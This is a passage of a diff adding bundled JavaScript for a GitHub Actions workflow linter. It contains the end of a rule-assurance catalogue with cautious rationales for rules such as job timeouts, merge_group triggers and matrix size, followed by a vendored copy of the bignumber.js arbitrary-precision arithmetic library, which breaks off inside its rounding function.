+    {
+      "id": "workflow/duplicate-push-pull-request-trigger",
+      "metadataSha256": "f9fb7e184757da5548549558f343f7b0a7a839a9936bdcfb0f7af05ade9faead",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A workflow accepting both broad `push` and `pull_request` events may repeat overlapping work for same-repository pull requests."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A push to an open same-repository pull request can trigger both push and pull_request runs. They are not equivalent: push usually checks the branch tip, while pull_request checks a synthetic merge commit, and event conditions, paths, permissions and required checks can differ. Review whether that overlap is intentional. Restricting push changes branch and tag coverage, so this rule never edits triggers automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/job-timeout",
+      "metadataSha256": "a105cc8bd3a00211388e9472553955a48adce0201dd628d6353d587630200ebe",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs should set `timeout-minutes` well below the 360 minute default."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A hung job holds a runner (and every dependent job, merge queue entry, and agent loop) for up to six hours. A tight timeout turns hangs into fast, retryable failures."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/larger-runner-unjustified",
+      "metadataSha256": "de588372415dd95606e2ae553f66b5eaa811ad77363051b32ddc07a606bd3155",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job on a larger (multi-core or macOS large) runner that only checks out, sets up tools, installs and runs formatters or linters."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A larger-looking runner label and familiar setup/lint commands do not establish resource needs or actual billing. Install hooks, native compilation, repository size, memory, networking and private runner policy can justify the selection. Compare representative end-to-end time, CPU/memory and current account pricing before downsizing. This is a measurement prompt, not proof of wasted cost."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/matrix-explosion",
+      "metadataSha256": "532ed6a978eb9767b1e6aac6f29bfdcca83c75811b2484aba039a234caa2af06",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A `strategy.matrix` whose version and runner dimensions multiply past the configured job budget, or past GitHub's 256-job limit."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A matrix runs jobs for its dimension combinations and can increase runner usage and queueing. GitHub limits a matrix to 256 jobs. A configured budget is an engineering preference, not evidence that intermediate versions are redundant: reducing version coverage can miss version-specific regressions. Suggested smaller matrices preserve all categorical and shard combinations on every retained runner, but deliberately reduce version combinations and require a coverage decision. Existing include/exclude rules are never replaced automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/merge-group",
+      "metadataSha256": "fd1b482ad7230d79e30bfab8bd6a71e0c0d1b67e576e4d3d3e75dcb87b069cde",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI workflows that run on `pull_request` should also run on `merge_group`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Agent-heavy repositories open and merge many pull requests at once, so a merge queue is the only practical way to keep the default branch green without serial rebases. A merge queue waits for the required checks to report on the `merge_group` event; a required-check workflow that only listens to `pull_request` never runs there, so queued pull requests stall until they time out."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/outdated-action-major",
+      "metadataSha256": "95735ac8f1530804c7139c91bc076f0a24b11048293d23a230cde9846e16d29d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Well-known actions should use their current major version, and local JavaScript actions should run on node24."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The maintained major/runtime table identifies releases to review for runtime support, security and performance changes. Newer majors can introduce breaking changes and are not guaranteed faster. Check the pinned action's source and release notes, target runner requirements and GitHub Enterprise Server support before upgrading; the table does not establish how an arbitrary pinned release was tested or executed."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/setup-action-missing-version-file",
+      "metadataSha256": "16b2371cffb2aad95c42991fc4c25d9f87d15c24e1b8dac615009c3f8a245880",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Language setup actions (setup-node, setup-python, setup-go, setup-dotnet) should pin the toolchain with a version input or the repository's version file."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without explicit version inputs or supported implicit version files, setup actions generally fall back to pre-installed toolchains. Hosted image updates or custom runner provisioning may then change the selected version. Reusing the project's supported version file can align CI and local development, but version ranges, aliases and .NET roll-forward policies still permit different releases. A version input is not a hermetic-build guarantee. Selecting a toolchain can change behavior and therefore is never automatically applied."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "workflow/unnecessary-needs-serialization",
+      "metadataSha256": "9143b14d0c549600f73490e06eaf2c71ec78153972d23bbf6219c014048d0949",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review `needs` edges without a recognized data transfer; they still provide success gating."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Hosted jobs do not share their ordinary filesystem merely because one needs another. Outputs, artifacts, caches and external systems can transfer data. Even without data transfer, needs provides ordering and success/skip/failure gating; an installation can intentionally validate dependencies or have external side effects. This insight identifies no recognized data transfer, not a redundant edge. Removing it changes behavior and requires an explicit decision about gating and concurrency."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    }
+  ]
+};
+
+// src/lint/assurance.ts
+var entries2 = new Map(RULE_ASSURANCE.rules.map((entry2) => [entry2.id, entry2]));
+function ruleAssurance(id) {
+  const entry2 = entries2.get(id);
+  if (!entry2) throw new Error(`Missing explicit assurance catalogue entry for built-in rule "${id}".`);
+  return entry2;
+}
+function assuranceText(id) {
+  const entry2 = ruleAssurance(id);
+  return `Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.${entry2.optionalModelCertificates.length ? " Optional cache-key certificates prove only the declared-dependency string-partition model." : ""}`;
+}
+
 // src/lint/config.ts
 var import_yaml39 = __toESM(require_dist(), 1);
+
+// node_modules/bignumber.js/bignumber.mjs
+var isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i;
+var mathceil = Math.ceil;
+var mathfloor = Math.floor;
+var bignumberError = "[BigNumber Error] ";
+var tooManyDigits = bignumberError + "Number primitive has more than 15 significant digits: ";
+var BASE = 1e14;
+var LOG_BASE = 14;
+var MAX_SAFE_INTEGER = 9007199254740991;
+var POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13];
+var SQRT_BASE = 1e7;
+var MAX = 1e9;
+function clone(configObject) {
+  var div, convertBase, parseNumeric, P2 = BigNumber2.prototype = { constructor: BigNumber2, toString: null, valueOf: null }, ONE = new BigNumber2(1), DECIMAL_PLACES = 20, ROUNDING_MODE = 4, TO_EXP_NEG = -7, TO_EXP_POS = 21, MIN_EXP = -1e7, MAX_EXP = 1e7, CRYPTO = false, MODULO_MODE = 1, POW_PRECISION = 0, FORMAT = {
+    prefix: "",
+    groupSize: 3,
+    secondaryGroupSize: 0,
+    groupSeparator: ",",
+    decimalSeparator: ".",
+    fractionGroupSize: 0,
+    fractionGroupSeparator: "\xA0",
+    // non-breaking space
+    suffix: ""
+  }, ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz", alphabetHasNormalDecimalDigits = true;
+  function BigNumber2(v, b) {
+    var alphabet, c2, caseChanged, e, i, isNum, len, str2, x = this;
+    if (!(x instanceof BigNumber2)) return new BigNumber2(v, b);
+    if (b == null) {
+      if (v && v._isBigNumber === true) {
+        x.s = v.s;
+        if (!v.c || v.e > MAX_EXP) {
+          x.c = x.e = null;
+        } else if (v.e < MIN_EXP) {
+          x.c = [x.e = 0];
+        } else {
+          x.e = v.e;
+          x.c = v.c.slice();
+        }
+        return;
+      }
+      if ((isNum = typeof v == "number") && v * 0 == 0) {
+        x.s = 1 / v < 0 ? (v = -v, -1) : 1;
+        if (v === ~~v) {
+          for (e = 0, i = v; i >= 10; i /= 10, e++) ;
+          if (e > MAX_EXP) {
+            x.c = x.e = null;
+          } else {
+            x.e = e;
+            x.c = [v];
+          }
+          return;
+        }
+        str2 = String(v);
+      } else {
+        if (!isNumeric.test(str2 = String(v))) return parseNumeric(x, str2, isNum);
+        x.s = str2.charCodeAt(0) == 45 ? (str2 = str2.slice(1), -1) : 1;
+      }
+      if ((e = str2.indexOf(".")) > -1) str2 = str2.replace(".", "");
+      if ((i = str2.search(/e/i)) > 0) {
+        if (e < 0) e = i;
+        e += +str2.slice(i + 1);
+        str2 = str2.substring(0, i);
+      } else if (e < 0) {
+        e = str2.length;
+      }
+    } else {
+      intCheck(b, 2, ALPHABET.length, "Base");
+      if (b == 10 && alphabetHasNormalDecimalDigits) {
+        x = new BigNumber2(v);
+        return round2(x, DECIMAL_PLACES + x.e + 1, ROUNDING_MODE);
+      }
+      str2 = String(v);
+      if (isNum = typeof v == "number") {
+        if (v * 0 != 0) return parseNumeric(x, str2, isNum, b);
+        x.s = 1 / v < 0 ? (str2 = str2.slice(1), -1) : 1;
+        if (BigNumber2.DEBUG && str2.replace(/^0\.0*|\./, "").length > 15) {
+          throw Error(tooManyDigits + v);
+        }
+      } else {
+        x.s = str2.charCodeAt(0) === 45 ? (str2 = str2.slice(1), -1) : 1;
+      }
+      alphabet = ALPHABET.slice(0, b);
+      e = i = 0;
+      for (len = str2.length; i < len; i++) {
+        if (alphabet.indexOf(c2 = str2.charAt(i)) < 0) {
+          if (c2 == ".") {
+            if (i > e) {
+              e = len;
+              continue;
+            }
+          } else if (!caseChanged) {
+            if (str2 == str2.toUpperCase() && (str2 = str2.toLowerCase()) || str2 == str2.toLowerCase() && (str2 = str2.toUpperCase())) {
+              caseChanged = true;
+              i = -1;
+              e = 0;
+              continue;
+            }
+          }
+          return parseNumeric(x, String(v), isNum, b);
+        }
+      }
+      isNum = false;
+      str2 = convertBase(str2, b, 10, x.s);
+      if ((e = str2.indexOf(".")) > -1) str2 = str2.replace(".", "");
+      else e = str2.length;
+    }
+    for (i = 0; str2.charCodeAt(i) === 48; i++) ;
+    for (len = str2.length; str2.charCodeAt(--len) === 48; ) ;
+    if (str2 = str2.slice(i, ++len)) {
+      len -= i;
+      if (isNum && BigNumber2.DEBUG && len > 15 && (v > MAX_SAFE_INTEGER || v !== mathfloor(v))) {
+        throw Error(tooManyDigits + x.s * v);
+      }
+      if ((e = e - i - 1) > MAX_EXP) {
+        x.c = x.e = null;
+      } else if (e < MIN_EXP) {
+        x.c = [x.e = 0];
+      } else {
+        x.e = e;
+        x.c = [];
+        i = (e + 1) % LOG_BASE;
+        if (e < 0) i += LOG_BASE;
+        if (i < len) {
+          if (i) x.c.push(+str2.slice(0, i));
+          for (len -= LOG_BASE; i < len; ) {
+            x.c.push(+str2.slice(i, i += LOG_BASE));
+          }
+          i = LOG_BASE - (str2 = str2.slice(i)).length;
+        } else {
+          i -= len;
+        }
+        for (; i--; str2 += "0") ;
+        x.c.push(+str2);
+      }
+    } else {
+      x.c = [x.e = 0];
+    }
+  }
+  BigNumber2.clone = clone;
+  BigNumber2.ROUND_UP = 0;
+  BigNumber2.ROUND_DOWN = 1;
+  BigNumber2.ROUND_CEIL = 2;
+  BigNumber2.ROUND_FLOOR = 3;
+  BigNumber2.ROUND_HALF_UP = 4;
+  BigNumber2.ROUND_HALF_DOWN = 5;
+  BigNumber2.ROUND_HALF_EVEN = 6;
+  BigNumber2.ROUND_HALF_CEIL = 7;
+  BigNumber2.ROUND_HALF_FLOOR = 8;
+  BigNumber2.EUCLID = 9;
+  BigNumber2.config = BigNumber2.set = function(obj) {
+    var p2, v;
+    if (obj != null) {
+      if (typeof obj == "object") {
+        if (obj.hasOwnProperty(p2 = "DECIMAL_PLACES")) {
+          v = obj[p2];
+          intCheck(v, 0, MAX, p2);
+          DECIMAL_PLACES = v;
+        }
+        if (obj.hasOwnProperty(p2 = "ROUNDING_MODE")) {
+          v = obj[p2];
+          intCheck(v, 0, 8, p2);
+          ROUNDING_MODE = v;
+        }
+        if (obj.hasOwnProperty(p2 = "EXPONENTIAL_AT")) {
+          v = obj[p2];
+          if (v && v.pop) {
+            intCheck(v[0], -MAX, 0, p2);
+            intCheck(v[1], 0, MAX, p2);
+            TO_EXP_NEG = v[0];
+            TO_EXP_POS = v[1];
+          } else {
+            intCheck(v, -MAX, MAX, p2);
+            TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
+          }
+        }
+        if (obj.hasOwnProperty(p2 = "RANGE")) {
+          v = obj[p2];
+          if (v && v.pop) {
+            intCheck(v[0], -MAX, -1, p2);
+            intCheck(v[1], 1, MAX, p2);
+            MIN_EXP = v[0];
+            MAX_EXP = v[1];
+          } else {
+            intCheck(v, -MAX, MAX, p2);
+            if (v) {
+              MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
+            } else {
+              throw Error(bignumberError + p2 + " cannot be zero: " + v);
+            }
+          }
+        }
+        if (obj.hasOwnProperty(p2 = "CRYPTO")) {
+          v = obj[p2];
+          if (v === !!v) {
+            if (v) {
+              if (typeof crypto != "undefined" && crypto && (crypto.getRandomValues || crypto.randomBytes)) {
+                CRYPTO = v;
+              } else {
+                CRYPTO = !v;
+                throw Error(bignumberError + "crypto unavailable");
+              }
+            } else {
+              CRYPTO = v;
+            }
+          } else {
+            throw Error(bignumberError + p2 + " not true or false: " + v);
+          }
+        }
+        if (obj.hasOwnProperty(p2 = "MODULO_MODE")) {
+          v = obj[p2];
+          intCheck(v, 0, 9, p2);
+          MODULO_MODE = v;
+        }
+        if (obj.hasOwnProperty(p2 = "POW_PRECISION")) {
+          v = obj[p2];
+          intCheck(v, 0, MAX, p2);
+          POW_PRECISION = v;
+        }
+        if (obj.hasOwnProperty(p2 = "FORMAT")) {
+          v = obj[p2];
+          if (typeof v == "object") FORMAT = v;
+          else throw Error(bignumberError + p2 + " not an object: " + v);
+        }
+        if (obj.hasOwnProperty(p2 = "ALPHABET")) {
+          v = obj[p2];
+          if (typeof v == "string" && !/^.?$|[+\-.\s]|(.).*\1/.test(v)) {
+            alphabetHasNormalDecimalDigits = v.slice(0, 10) == "0123456789";
+            ALPHABET = v;
+          } else {
+            throw Error(bignumberError + p2 + " invalid: " + v);
+          }
+        }
+      } else {
+        throw Error(bignumberError + "Object expected: " + obj);
+      }
+    }
+    return {
+      DECIMAL_PLACES,
+      ROUNDING_MODE,
+      EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
+      RANGE: [MIN_EXP, MAX_EXP],
+      CRYPTO,
+      MODULO_MODE,
+      POW_PRECISION,
+      FORMAT,
+      ALPHABET
+    };
+  };
+  BigNumber2.isBigNumber = function(v) {
+    if (!v || v._isBigNumber !== true) return false;
+    if (!BigNumber2.DEBUG) return true;
+    var i, n, c2 = v.c, e = v.e, s = v.s;
+    out: if ({}.toString.call(c2) == "[object Array]") {
+      if ((s === 1 || s === -1) && e >= -MAX && e <= MAX && e === mathfloor(e)) {
+        if (c2[0] === 0) {
+          if (e === 0 && c2.length === 1) return true;
+          break out;
+        }
+        i = (e + 1) % LOG_BASE;
+        if (i < 1) i += LOG_BASE;
+        if (String(c2[0]).length == i) {
+          for (i = 0; i < c2.length; i++) {
+            n = c2[i];
+            if (n < 0 || n >= BASE || n !== mathfloor(n)) break out;
+          }
+          if (n !== 0) return true;
+        }
+      }
+    } else if (c2 === null && e === null && (s === null || s === 1 || s === -1)) {
+      return true;
+    }
+    throw Error(bignumberError + "Invalid BigNumber: " + v);
+  };
+  BigNumber2.maximum = BigNumber2.max = function() {
+    return maxOrMin(arguments, -1);
+  };
+  BigNumber2.minimum = BigNumber2.min = function() {
+    return maxOrMin(arguments, 1);
+  };
+  BigNumber2.random = (function() {
+    var pow2_53 = 9007199254740992;
+    var random53bitInt = Math.random() * pow2_53 & 2097151 ? function() {
+      return mathfloor(Math.random() * pow2_53);
+    } : function() {
+      return (Math.random() * 1073741824 | 0) * 8388608 + (Math.random() * 8388608 | 0);
+    };
+    return function(dp) {
+      var a, b, e, k, v, i = 0, c2 = [], rand = new BigNumber2(ONE);
+      if (dp == null) dp = DECIMAL_PLACES;
+      else intCheck(dp, 0, MAX);
+      k = mathceil(dp / LOG_BASE);
+      if (CRYPTO) {
+        if (crypto.getRandomValues) {
+          a = crypto.getRandomValues(new Uint32Array(k *= 2));
+          for (; i < k; ) {
+            v = a[i] * 131072 + (a[i + 1] >>> 11);
+            if (v >= 9e15) {
+              b = crypto.getRandomValues(new Uint32Array(2));
+              a[i] = b[0];
+              a[i + 1] = b[1];
+            } else {
+              c2.push(v % 1e14);
+              i += 2;
+            }
+          }
+          i = k / 2;
+        } else if (crypto.randomBytes) {
+          a = crypto.randomBytes(k *= 7);
+          for (; i < k; ) {
+            v = (a[i] & 31) * 281474976710656 + a[i + 1] * 1099511627776 + a[i + 2] * 4294967296 + a[i + 3] * 16777216 + (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];
+            if (v >= 9e15) {
+              crypto.randomBytes(7).copy(a, i);
+            } else {
+              c2.push(v % 1e14);
+              i += 7;
+            }
+          }
+          i = k / 7;
+        } else {
+          CRYPTO = false;
+          throw Error(bignumberError + "crypto unavailable");
+        }
+      }
+      if (!CRYPTO) {
+        for (; i < k; ) {
+          v = random53bitInt();
+          if (v < 9e15) c2[i++] = v % 1e14;
+        }
+      }
+      k = c2[--i];
+      dp %= LOG_BASE;
+      if (k && dp) {
+        v = POWS_TEN[LOG_BASE - dp];
+        c2[i] = mathfloor(k / v) * v;
+      }
+      for (; c2[i] === 0; c2.pop(), i--) ;
+      if (i < 0) {
+        c2 = [e = 0];
+      } else {
+        for (e = -1; c2[0] === 0; c2.splice(0, 1), e -= LOG_BASE) ;
+        for (i = 1, v = c2[0]; v >= 10; v /= 10, i++) ;
+        if (i < LOG_BASE) e -= LOG_BASE - i;
+      }
+      rand.e = e;
+      rand.c = c2;
+      return rand;
+    };
+  })();
+  BigNumber2.sum = function() {
+    var i = 1, args = arguments, sum = new BigNumber2(args[0]);
+    for (; i < args.length; ) sum = sum.plus(args[i++]);
+    return sum;
+  };
+  convertBase = /* @__PURE__ */ (function() {
+    var decimal = "0123456789";
+    function toBaseOut(str2, baseIn, baseOut, alphabet) {
+      var j, arr = [0], arrL, i = 0, len = str2.length;
+      for (; i < len; ) {
+        for (arrL = arr.length; arrL--; arr[arrL] *= baseIn) ;
+        arr[0] += alphabet.indexOf(str2.charAt(i++));
+        for (j = 0; j < arr.length; j++) {
+          if (arr[j] > baseOut - 1) {
+            if (arr[j + 1] == null) arr[j + 1] = 0;
+            arr[j + 1] += arr[j] / baseOut | 0;
+            arr[j] %= baseOut;
+          }
+        }
+      }
+      return arr.reverse();
+    }
+    return function(str2, baseIn, baseOut, sign, callerIsToString) {
+      var alphabet, d2, e, k, r, x, xc, y, i = str2.indexOf("."), dp = DECIMAL_PLACES, rm2 = ROUNDING_MODE;
+      if (i >= 0) {
+        k = POW_PRECISION;
+        POW_PRECISION = 0;
+        str2 = str2.replace(".", "");
+        y = new BigNumber2(baseIn);
+        x = y.pow(str2.length - i);
+        POW_PRECISION = k;
+        y.c = toBaseOut(
+          toFixedPoint(coeffToString(x.c), x.e, "0"),
+          10,
+          baseOut,
+          decimal
+        );
+        y.e = y.c.length;
+      }
+      xc = toBaseOut(str2, baseIn, baseOut, callerIsToString ? (alphabet = ALPHABET, decimal) : (alphabet = decimal, ALPHABET));
+      e = k = xc.length;
+      for (; xc[--k] == 0; xc.pop()) ;
+      if (!xc[0]) return alphabet.charAt(0);
+      if (i < 0) {
+        --e;
+      } else {
+        x.c = xc;
+        x.e = e;
+        x.s = sign;
+        x = div(x, y, dp, rm2, baseOut);
+        xc = x.c;
+        r = x.r;
+        e = x.e;
+      }
+      d2 = e + dp + 1;
+      i = xc[d2];
+      k = baseOut / 2;
+      r = r || d2 < 0 || xc[d2 + 1] != null;
+      r = rm2 < 4 ? (i != null || r) && (rm2 == 0 || rm2 == (x.s < 0 ? 3 : 2)) : i > k || i == k && (rm2 == 4 || r || rm2 == 6 && xc[d2 - 1] & 1 || rm2 == (x.s < 0 ? 8 : 7));
+      if (d2 < 1 || !xc[0]) {
+        str2 = r ? toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0)) : alphabet.charAt(0);
+      } else {
+        xc.length = d2;
+        if (r) {
+          for (--baseOut; ++xc[--d2] > baseOut; ) {
+            xc[d2] = 0;
+            if (!d2) {
+              ++e;
+              xc = [1].concat(xc);
+            }
+          }
+        }
+        for (k = xc.length; !xc[--k]; ) ;
+        for (i = 0, str2 = ""; i <= k; str2 += alphabet.charAt(xc[i++])) ;
+        str2 = toFixedPoint(str2, e, alphabet.charAt(0));
+      }
+      return str2;
+    };
+  })();
+  div = /* @__PURE__ */ (function() {
+    function multiply(x, k, base2) {
+      var m, temp, xlo, xhi, carry = 0, i = x.length, klo = k % SQRT_BASE, khi = k / SQRT_BASE | 0;
+      for (x = x.slice(); i--; ) {
+        xlo = x[i] % SQRT_BASE;
+        xhi = x[i] / SQRT_BASE | 0;
+        m = khi * xlo + xhi * klo;
+        temp = klo * xlo + m % SQRT_BASE * SQRT_BASE + carry;
+        carry = (temp / base2 | 0) + (m / SQRT_BASE | 0) + khi * xhi;
+        x[i] = temp % base2;
+      }
+      if (carry) x = [carry].concat(x);
+      return x;
+    }
+    function compare4(a, b, aL, bL) {
+      var i, cmp;
+      if (aL != bL) {
+        cmp = aL > bL ? 1 : -1;
+      } else {
+        for (i = cmp = 0; i < aL; i++) {
+          if (a[i] != b[i]) {
+            cmp = a[i] > b[i] ? 1 : -1;
+            break;
+          }
+        }
+      }
+      return cmp;
+    }
+    function subtract(a, b, aL, base2) {
+      var i = 0;
+      for (; aL--; ) {
+        a[aL] -= i;
+        i = a[aL] < b[aL] ? 1 : 0;
+        a[aL] = i * base2 + a[aL] - b[aL];
+      }
+      for (; !a[0] && a.length > 1; a.splice(0, 1)) ;
+    }
+    return function(x, y, dp, rm2, base2) {
+      var cmp, e, i, more, n, prod, prodL, q, qc, rem, remL, rem0, xi, xL, yc0, yL, yz, s = x.s == y.s ? 1 : -1, xc = x.c, yc = y.c;
+      if (!xc || !xc[0] || !yc || !yc[0]) {
+        return new BigNumber2(
+          // Return NaN if either NaN, or both Infinity or 0.
+          !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN : (
+            // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
+            xc && xc[0] == 0 || !yc ? s * 0 : s / 0
+          )
+        );
+      }
+      q = new BigNumber2(s);
+      qc = q.c = [];
+      e = x.e - y.e;
+      s = dp + e + 1;
+      if (!base2) {
+        base2 = BASE;
+        e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
+        s = s / LOG_BASE | 0;
+      }
+      for (i = 0; yc[i] == (xc[i] || 0); i++) ;
+      if (yc[i] > (xc[i] || 0)) e--;
+      if (s < 0) {
+        qc.push(1);
+        more = true;
+      } else {
+        xL = xc.length;
+        yL = yc.length;
+        i = 0;
+        s += 2;
+        n = mathfloor(base2 / (yc[0] + 1));
+        if (n > 1) {
+          yc = multiply(yc, n, base2);
+          xc = multiply(xc, n, base2);
+          yL = yc.length;
+          xL = xc.length;
+        }
+        xi = yL;
+        rem = xc.slice(0, yL);
+        remL = rem.length;
+        for (; remL < yL; rem[remL++] = 0) ;
+        yz = yc.slice();
+        yz = [0].concat(yz);
+        yc0 = yc[0];
+        if (yc[1] >= base2 / 2) yc0++;
+        do {
+          n = 0;
+          cmp = compare4(yc, rem, yL, remL);
+          if (cmp < 0) {
+            rem0 = rem[0];
+            if (yL != remL) rem0 = rem0 * base2 + (rem[1] || 0);
+            n = mathfloor(rem0 / yc0);
+            if (n > 1) {
+              if (n >= base2) n = base2 - 1;
+              prod = multiply(yc, n, base2);
+              prodL = prod.length;
+              remL = rem.length;
+              while (compare4(prod, rem, prodL, remL) == 1) {
+                n--;
+                subtract(prod, yL < prodL ? yz : yc, prodL, base2);
+                prodL = prod.length;
+                cmp = 1;
+              }
+            } else {
+              if (n == 0) {
+                cmp = n = 1;
+              }
+              prod = yc.slice();
+              prodL = prod.length;
+            }
+            if (prodL < remL) prod = [0].concat(prod);
+            subtract(rem, prod, remL, base2);
+            remL = rem.length;
+            if (cmp == -1) {
+              while (compare4(yc, rem, yL, remL) < 1) {
+                n++;
+                subtract(rem, yL < remL ? yz : yc, remL, base2);
+                remL = rem.length;
+              }
+            }
+          } else if (cmp === 0) {
+            n++;
+            rem = [0];
+          }
+          qc[i++] = n;
+          if (rem[0]) {
+            rem[remL++] = xc[xi] || 0;
+          } else {
+            rem = [xc[xi]];
+            remL = 1;
+          }
+        } while ((xi++ < xL || rem[0] != null) && s--);
+        more = rem[0] != null;
+        if (!qc[0]) qc.splice(0, 1);
+      }
+      if (base2 == BASE) {
+        for (i = 1, s = qc[0]; s >= 10; s /= 10, i++) ;
+        round2(q, dp + (q.e = i + e * LOG_BASE - 1) + 1, rm2, more);
+      } else {
+        q.e = e;
+        q.r = +more;
+      }
+      return q;
+    };
+  })();
+  function format3(n, i, rm2, id) {
+    var c0, e, ne, len, str2;
+    if (rm2 == null) rm2 = ROUNDING_MODE;
+    else intCheck(rm2, 0, 8);
+    if (!n.c) return n.toString();
+    c0 = n.c[0];
+    ne = n.e;
+    if (i == null) {
+      str2 = coeffToString(n.c);
+      str2 = id == 1 || id == 2 && (ne <= TO_EXP_NEG || ne >= TO_EXP_POS) ? toExponential(str2, ne) : toFixedPoint(str2, ne, "0");
+    } else {
+      n = round2(new BigNumber2(n), i, rm2);
+      e = n.e;
+      str2 = coeffToString(n.c);
+      len = str2.length;
+      if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {
+        for (; len < i; str2 += "0", len++) ;
+        str2 = toExponential(str2, e);
+      } else {
+        i -= ne + (id === 2 && e > ne);
+        str2 = toFixedPoint(str2, e, "0");
+        if (e + 1 > len) {
+          if (--i > 0) for (str2 += "."; i--; str2 += "0") ;
+        } else {
+          i += e - len;
+          if (i > 0) {
+            if (e + 1 == len) str2 += ".";
+            for (; i--; str2 += "0") ;
+          }
+        }
+      }
+    }
+    return n.s < 0 && c0 ? "-" + str2 : str2;
+  }
+  function maxOrMin(args, n) {
+    var k, y, i = 1, x = new BigNumber2(args[0]);
+    for (; i < args.length; i++) {
+      y = new BigNumber2(args[i]);
+      if (!y.s || (k = compare(x, y)) === n || k === 0 && x.s === n) {
+        x = y;
+      }
+    }
+    return x;
+  }
+  function normalise(n, c2, e) {
+    var i = 1, j = c2.length;
+    for (; !c2[--j]; c2.pop()) ;
+    for (j = c2[0]; j >= 10; j /= 10, i++) ;
+    if ((e = i + e * LOG_BASE - 1) > MAX_EXP) {
+      n.c = n.e = null;
+    } else if (e < MIN_EXP) {
+      n.c = [n.e = 0];
+    } else {
+      n.e = e;
+      n.c = c2;
+    }
+    return n;
+  }
+  parseNumeric = /* @__PURE__ */ (function() {
+    var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i, dotAfter = /^([^.]+)\.$/, dotBefore = /^\.([^.]+)$/, isInfinityOrNaN = /^-?(Infinity|NaN)$/, whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
+    return function(x, str2, isNum, b) {
+      var base2, s = isNum ? str2 : str2.replace(whitespaceOrPlus, "");
+      if (isInfinityOrNaN.test(s)) {
+        x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
+      } else {
+        if (!isNum) {
+          s = s.replace(basePrefix, function(m, p1, p2) {
+            base2 = (p2 = p2.toLowerCase()) == "x" ? 16 : p2 == "b" ? 2 : 8;
+            return !b || b == base2 ? p1 : m;
+          });
+          if (b) {
+            base2 = b;
+            s = s.replace(dotAfter, "$1").replace(dotBefore, "0.$1");
+          }
+          if (str2 != s) return new BigNumber2(s, base2);
+        }
+        if (BigNumber2.DEBUG) {
+          throw Error(bignumberError + "Not a" + (b ? " base " + b : "") + " number: " + str2);
+        }
+        x.s = null;
+      }
+      x.c = x.e = null;
+    };
+  })();
+  function round2(x, sd, rm2, r) {
+    var d2, i, j, k, n, ni, rd, xc = x.c, pows10 = POWS_TEN;
+    if (xc) {
+      out: {
+        for (d2 = 1, k = xc[0]; k >= 10; k /= 10, d2++) ;
+        i = sd - d2;
+        if (i < 0) {
+          i += LOG_BASE;
+          j = sd;
+          n = xc[ni = 0];
+          rd = mathfloor(n / pows10[d2 - j - 1] % 10);
+        } else {
+          ni = mathceil((i + 1) / LOG_BASE);
+          if (ni >= xc.length) {
+            if (r) {
+              for (; xc.length <= ni; xc.push(0)) ;
+              n = rd = 0;
+              d2 = 1;
+              i %= LOG_BASE;
+              j = i - LOG_BASE + 1;
+            } else {
+              break out;
+            }
+          } else {
+            n = k = xc[ni];
